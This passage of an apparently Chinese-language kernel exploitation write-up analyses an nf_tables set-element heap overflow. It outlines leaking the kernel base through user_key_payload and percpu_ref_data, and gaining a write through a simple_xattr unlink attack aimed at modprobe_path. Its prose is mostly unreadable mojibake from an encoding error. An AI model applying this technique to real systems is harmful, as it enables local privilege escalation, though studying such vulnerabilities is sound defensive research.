class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125; __attribute__((aligned(__alignof__(u64))));<br></code></pre></td></tr></table></figure><p>ç„¶åkeyï¼Œkey_endå’Œdataä¼ é€’ç»™nft_set_elem_initï¼Œè¿”å›ä¸€ä¸ªpriv</p></li></ul><h3 id="tmpl"><a href="#tmpl" class="headerlink" title="tmpl"></a>tmpl</h3><p>tmplç›¸å…³æ•°æ®å¤„ç†</p><h4 id="nft-add-set-elem-1"><a href="#nft-add-set-elem-1" class="headerlink" title="nft_add_set_elem"></a>nft_add_set_elem</h4><p>nft_set_ext_tmplç»“æ„åŠç›¸å…³enumï¼Œä¸€ä¸ªç”¨äºå‡†å¤‡nft_set_extç»“æ„ä½“çš„æ¨¡æ¿ç»“æ„ä½“ï¼Œç”¨äºè®°å½•å„ä¸ªæ•°æ®çš„åç§»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext_tmpl</span> &#123;</span><br>u16len;<br>u8offset[NFT_SET_EXT_NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_extensions</span> &#123;</span><br>NFT_SET_EXT_KEY,<br>NFT_SET_EXT_KEY_END,<br>NFT_SET_EXT_DATA,<br>NFT_SET_EXT_FLAGS,<br>NFT_SET_EXT_TIMEOUT,<br>NFT_SET_EXT_EXPIRATION,<br>NFT_SET_EXT_USERDATA,<br>NFT_SET_EXT_EXPRESSIONS,<br>NFT_SET_EXT_OBJREF,<br>NFT_SET_EXT_NUM<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…ˆprepareä¸€ä¸ªtmplï¼Œå°±æ˜¯è¿›è¡Œä¸€ä¸ªç»“æ„ä½“çš„åˆå§‹åŒ–ï¼Œå°¤å…¶æ˜¯åˆå§‹åŒ–len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_prepare</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl)</span><br>&#123;<br><span class="hljs-built_in">memset</span>(tmpl, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*tmpl));<br>tmpl-&gt;len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_set_ext);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åçš„æ•°æ®è§£æéƒ½ä¼šæ›´æ–°tmplçš„é•¿åº¦å’Œå¯¹åº”åç§»</p><ul><li><p>è°ƒç”¨nft_set_ext_add_lengthæ›´æ–°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span class="hljs-built_in">set</span>-&gt;klen);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="hljs-built_in">set</span>-&gt;klen);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);<br>nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_EXPRESSIONS,<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_set_elem_expr) +<br>size);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_add_length</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl, u8 id,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br>tmpl-&gt;len = ALIGN(tmpl-&gt;len, nft_set_ext_types[id].align);<br>BUG_ON(tmpl-&gt;len &gt; U8_MAX);<br>tmpl-&gt;offset[id] = tmpl-&gt;len;<br>tmpl-&gt;len+= nft_set_ext_types[id].len + len;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨nft_set_ext_addæ›´æ–°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_FLAGS);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_EXPIRATION);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_TIMEOUT);<br>nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_OBJREF);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl, u8 id)</span><br>&#123;<br>nft_set_ext_add_length(tmpl, id, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>ç„¶åå°±è¿›å…¥åˆ°äº†nft_set_elem_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">elem.priv = nft_set_elem_init(<span class="hljs-built_in">set</span>, &amp;tmpl, elem.key.val.data,<br>   elem.key_end.val.data, elem.data.val.data,<br>   timeout, expiration, GFP_KERNEL);<br></code></pre></td></tr></table></figure><h4 id="nft-set-elem-init"><a href="#nft-set-elem-init" class="headerlink" title="nft_set_elem_init"></a>nft_set_elem_init</h4><p>å¼€å§‹å¡«å……nft_set_ext</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext</span> &#123;</span><br>u8genmask;<br>u8offset[NFT_SET_EXT_NUM];<br><span class="hljs-type">char</span>data[];<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…ˆç”³è¯·ç©ºé—´ï¼ŒåŠ çš„è¿™ä¸ªelemsizeä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œè¿™æ—¶å€™tmpl-&gt;lenåŒ…æ‹¬nft_set_extç»“æ„ä½“å¤´çš„å¤§å°+æ•°æ®é•¿åº¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">elem = kzalloc(<span class="hljs-built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);<br></code></pre></td></tr></table></figure><p>nft_set_ext_initå°±æ˜¯åœ¨å¤åˆ¶offset</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nft_set_ext_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_set_ext *ext,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_set_ext_tmpl *tmpl)</span><br>&#123;<br><span class="hljs-built_in">memcpy</span>(ext-&gt;offset, tmpl-&gt;offset, <span class="hljs-keyword">sizeof</span>(ext-&gt;offset));<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å¤åˆ¶æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="hljs-built_in">set</span>-&gt;klen);<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="hljs-built_in">set</span>-&gt;klen);<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å¯ä»¥çœ‹åˆ°åœ¨å¤„ç†dataçš„æ—¶å€™</p><ul><li><p>tmplæ›´æ–°ç”¨çš„æ˜¯desc.len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);<br></code></pre></td></tr></table></figure></li><li><p>memcpyä½¿ç”¨çš„æ˜¯set-&gt;dlen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure></li></ul><h3 id="desc-lençš„èµ‹å€¼"><a href="#desc-lençš„èµ‹å€¼" class="headerlink" title="desc.lençš„èµ‹å€¼"></a>desc.lençš„èµ‹å€¼</h3><p>descçš„èµ‹å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="hljs-literal">NULL</span>) &#123;<br>err = nft_setelem_parse_data(ctx, <span class="hljs-built_in">set</span>, &amp;desc, &amp;elem.data.val,<br>     nla[NFTA_SET_ELEM_DATA]);<br></code></pre></td></tr></table></figure><p>nft_setelem_parse_dataä¸­ä¼šæ£€æŸ¥desc-&gt;len&#x3D;&#x3D;set-&gt;dlenï¼Œä½†å¦‚æœæ˜¯verdictåˆ™ä¸ä¼šè¿›è¡Œè¿™ä¸ªæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_setelem_parse_data</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_ctx *ctx, <span class="hljs-keyword">struct</span> nft_set *<span class="hljs-built_in">set</span>,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br>err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="hljs-built_in">set</span>-&gt;dlen) &#123;<span class="hljs-comment">// !</span><br>nft_data_release(data, desc-&gt;type);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="set-gt-dlençš„èµ‹å€¼"><a href="#set-gt-dlençš„èµ‹å€¼" class="headerlink" title="set-&gt;dlençš„èµ‹å€¼"></a>set-&gt;dlençš„èµ‹å€¼</h3><p>nf_table_newsetå¦‚æœdtypeä¸æ˜¯verdictå¯ä»¥è‡ªå®šä¹‰dlenï¼Œåªè¦ä¸è¶…è¿‡64ï¼Œå¦‚æœæ˜¯verdictåº”è¯¥æ˜¯16</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;<br><span class="hljs-keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br>desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));<br><span class="hljs-keyword">if</span> (desc.dlen == <span class="hljs-number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125; <span class="hljs-keyword">else</span><br>desc.dlen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_verdict);<br><span class="hljs-comment">// â€¦â€¦</span><br><span class="hljs-built_in">set</span>-&gt;dlen = desc.dlen;<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>å¦‚æœå¾€ä¸€ä¸ªNFT_DATA_VALUEçš„seté‡Œæ·»åŠ ä¸€ä¸ªNFT_DATA_VERDICTå°±å¯ä»¥è¿›è¡Œæº¢å‡ºï¼Œæœ€å¤š48å­—èŠ‚ï¼Œä¼¼ä¹æ²¡æœ‰è¿›è¡Œtypeä¸€è‡´çš„æ£€æŸ¥</p><ul><li><p>srcçš„dataæ˜¯nft_add_set_elemçš„æ ˆä¸Šçš„æ•°æ®ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_elem</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key_end;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> <span class="hljs-title">val</span>;</span><br>&#125; data;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>destæ˜¯kzallocå¾—åˆ°çš„å †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">elem = kzalloc(<span class="hljs-built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);<br><span class="hljs-comment">// â€¦â€¦</span><br><span class="hljs-keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))<br><span class="hljs-built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="hljs-built_in">set</span>-&gt;dlen);<br></code></pre></td></tr></table></figure></li></ul><p>å¯ä»¥é€šè¿‡å…ˆaddä¸€ä¸ªNFT_DATA_VALUEå¸ƒç½®æ ˆä¸Šæ•°æ®ï¼Œå†addä¸€ä¸ªNFT_DATA_VERDICTå°±å¯ä»¥ä¿è¯æº¢å‡ºçš„æ•°æ®æ˜¯å¯æ§çš„</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´å¯¹è±¡çš„å¤§å°å–å†³äºç”¨æˆ·é€‰é¡¹</p><ul><li>20å­—èŠ‚çš„headï¼Œelemsizeï¼ˆ8ï¼‰+ nft_set_ext_tmplï¼ˆ2+9ï¼‰+ å¯¹é½ï¼ˆ1ï¼‰</li><li>NFT_SET_ELEM_KEYå¡«å……28å­—èŠ‚</li><li>NFT_DATA_VERDICTå¡«å……16å­—èŠ‚</li></ul><p>è¿™æ ·elemä½äºkmalloc-64ï¼Œå¯ä»¥æº¢å‡º48å­—èŠ‚</p><h2 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h2><h3 id="æ³„éœ²å†…æ ¸åŸºå€"><a href="#æ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="æ³„éœ²å†…æ ¸åŸºå€"></a>æ³„éœ²å†…æ ¸åŸºå€</h3><p>å†…æ ¸ä¸­æœ‰ä¸€ä¸ªç”¨äºå¯†é’¥ç®¡ç†çš„å­ç³»ç»Ÿï¼Œæä¾›äº†add_keyç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥åˆ›å»ºï¼Œkeyctlç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥çš„è¯»å–ã€æ›´æ–°ã€é”€æ¯ç­‰åŠŸèƒ½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(add_key, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _type,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _description,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _payload,<br><span class="hljs-type">size_t</span>, plen,<br><span class="hljs-type">key_serial_t</span>, ringid)<br></code></pre></td></tr></table></figure><ul><li><p>sys_add_keyä¸­ä¼šå…ˆç”³è¯·ä¸¤å—ä¸´æ—¶å†…å­˜å­˜å‚¨ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶è¿‡æ¥çš„descriptionå’Œpayload</p><ul><li><p>descriptionï¼šsize &#x3D; 4096</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">description = strndup_user(_description, KEY_MAX_DESC_SIZE);<br></code></pre></td></tr></table></figure></li><li><p>payloadï¼šsize &#x3D; ç”¨æˆ·ä¼ æ¥çš„plen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">payload = kvmalloc(plen, GFP_KERNEL);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>è°ƒç”¨key_create_or_update</p><ul><li><p>è°ƒç”¨user_preparseå…¶ä¸­ä¸ºpayloadç”³è¯·user_key_payloadç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = index_key.type-&gt;preparse(&amp;prep); <span class="hljs-comment">// user_preparse</span><br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨key_alloc</p><ul><li><p><strong>ç”³è¯·keyç»“æ„ä½“ï¼ˆä»ç‹¬ç«‹çš„key_jarä¸­åˆ†é…ï¼‰</strong>ï¼Œè¿™æ˜¯å¯†é’¥çš„ä¸»ç»“æ„ä½“</p></li><li><p>ä¸ºdescriptionç”³è¯·ç©ºé—´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key-&gt;index_key.description = kmemdup(desc, desclen + <span class="hljs-number">1</span>, GFP_KERNEL);<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>æœ€åé‡Šæ”¾descriptionå’Œpayloadçš„ä¸´æ—¶ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">error3:<br>kvfree_sensitive(payload, plen);<br>error2:<br>kfree(description);<br></code></pre></td></tr></table></figure></li></ul><p>user_key_payloadç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><span class="hljs-comment">/* RCU destructor */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>datalen;<span class="hljs-comment">/* length of this data */</span><br><span class="hljs-type">char</span>data[] __aligned(__alignof__(u64)); <span class="hljs-comment">/* actual data */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ”¹å¤§datalenè¶Šç•Œè¯»</p><h3 id="æ³„éœ²å¯¹è±¡"><a href="#æ³„éœ²å¯¹è±¡" class="headerlink" title="æ³„éœ²å¯¹è±¡"></a>æ³„éœ²å¯¹è±¡</h3><p>percpu_ref_dataä¹Ÿä½äºkmalloc-64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">percpu_ref_data</span> &#123;</span><br><span class="hljs-type">atomic_long_t</span>count;<br><span class="hljs-type">percpu_ref_func_t</span>*release;<br><span class="hljs-type">percpu_ref_func_t</span>*confirm_switch;<br><span class="hljs-type">bool</span>force_atomic:<span class="hljs-number">1</span>;<br><span class="hljs-type">bool</span>allow_reinit:<span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">percpu_ref</span>*<span class="hljs-title">ref</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>io_uringä½¿ç”¨è¿™ä¸ªç»“æ„ä½“ï¼Œæ­¤æ—¶</p><ul><li>confirm_switchå’Œreleaseå¯ä»¥æ³„éœ²å†…æ ¸åŸºå€</li><li>refå¯ä»¥æ³„éœ²physmapåœ°å€</li></ul><p>percpu_ref_dataç”±percpu_ref_initç”³è¯·ï¼Œio_ring_ctx_allocå‡½æ•°ç”³è¯·äº†è¿™ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-keyword">struct</span> io_ring_ctx *<span class="hljs-title function_">io_ring_ctx_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_params *p)</span><br>&#123;<br><span class="hljs-comment">// â€¦â€¦</span><br><span class="hljs-keyword">if</span> (percpu_ref_init(&amp;ctx-&gt;refs, io_ring_ctx_ref_free,<br>    PERCPU_REF_ALLOW_REINIT, GFP_KERNEL))<br><span class="hljs-keyword">goto</span> err;<br>    <span class="hljs-comment">// â€¦â€¦</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»»æ„å†™"><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h2><h3 id="simple-xattr"><a href="#simple-xattr" class="headerlink" title="simple_xattr"></a>simple_xattr</h3><p>ç”¨äºå­˜å‚¨in-memory filesystemsï¼ˆtmpfsï¼‰çš„æ‰©å±•å±æ€§ï¼ˆxattrs - extended attributeï¼‰ï¼Œé€šè¿‡simple_xattr_allocç”³è¯·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">simple_xattr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">char</span> *name;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">char</span> value[];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>kmalloc-32ä»¥ä¸Š</li><li>æ— æ³•ä¿®æ”¹ï¼Œä¿®æ”¹ä¼šå°†æ—§çš„simple_xattr unlinkï¼Œå†linkä¸€ä¸ªæ–°çš„ä¸Šå»</li><li>æ‰€ä»¥ä¸èƒ½é€šè¿‡ä¿®æ”¹nextæˆ–sizeè¿›è¡Œè¶Šç•Œå†™</li><li>éç‰¹æƒç”¨æˆ·æ— æ³•è®¾ç½®simple_xattrï¼Œä½†ç³»ç»Ÿæ”¯æŒuser namespaceä¹Ÿå¯ä»¥</li></ul><h3 id="unlinking-attack"><a href="#unlinking-attack" class="headerlink" title="unlinking attack"></a>unlinking attack</h3><p>å’Œå †çš„unsafe unlinkå·®ä¸å¤šï¼Œä¸”å†…æ ¸çš„double linkæ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œåªè¦æ±‚nextå’Œprevéƒ½æ˜¯åˆæ³•åœ°å€</p><p>unlinkçš„æµç¨‹æ— éå°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next-&gt;prev = p-&gt;prev;<br>p-&gt;prev-&gt;next = p-&gt;next;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹p-&gt;nextå’Œp-&gt;prevï¼Œä»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next = modprobe_path - <span class="hljs-number">8</span> + <span class="hljs-number">1</span>;<span class="hljs-comment">// modeprobe_path : /sbin/modeprobe</span><br>p-&gt;prev = <span class="hljs-number">0xffff</span>xxxx2f706d74;<span class="hljs-comment">// b&#x27;tmp/\xXX\xXX\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><p>åˆ™unlinkè¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;next-&gt;prev = p-&gt;prev;<span class="hljs-comment">// modeprobe_path : 